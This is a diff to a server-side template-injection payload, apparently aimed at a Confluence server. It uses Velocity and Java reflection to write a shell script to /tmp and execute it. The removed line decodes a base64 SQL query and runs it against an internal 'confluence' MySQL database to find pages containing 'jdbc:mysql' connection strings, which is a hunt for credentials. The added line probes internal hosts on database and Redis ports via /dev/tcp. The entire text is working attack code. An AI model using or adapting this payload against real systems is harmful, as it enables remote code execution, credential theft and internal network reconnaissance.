@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("echo U0VMRUNUIGMuQ09OVEVOVElELCBjLlRJVExFLCBjLkxBU1RNT0REQVRFIEZST00gQ09OVEVOVCBjIEpPSU4gQk9EWUNPTlRFTlQgYiBPTiBiLkNPTlRFTlRJRD1jLkNPTlRFTlRJRCBXSEVSRSBiLkJPRFkgTElLRSAnJWpkYmM6bXlzcWwlJyBHUk9VUCBCWSBjLkNPTlRFTlRJRCBPUkRFUiBCWSBjLkxBU1RNT0REQVRFIERFU0MgTElNSVQgMzA7 | base64 -d > /tmp/q.sql; mysql -h10.18.19.53 -D confluence -N < /tmp/q.sql 2>&1; echo Q_DONE")
+$fw.write("echo ===P141; timeout 6 bash -c 'echo > /dev/tcp/10.25.159.141/3306' 2>&1 && echo OPEN141 || echo CLOSED141; echo ===P143; timeout 6 bash -c 'echo > /dev/tcp/10.25.159.143/6379' 2>&1 && echo OPEN143 || echo CLOSED143; echo ===P310; timeout 6 bash -c 'echo > /dev/tcp/192.168.3.10/40785' 2>&1 && echo OPEN310 || echo CLOSED310; echo ===P310b; timeout 6 bash -c 'echo > /dev/tcp/192.168.3.10/45093' 2>&1 && echo OPEN45093 || echo CLOSED45093; echo DONE")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
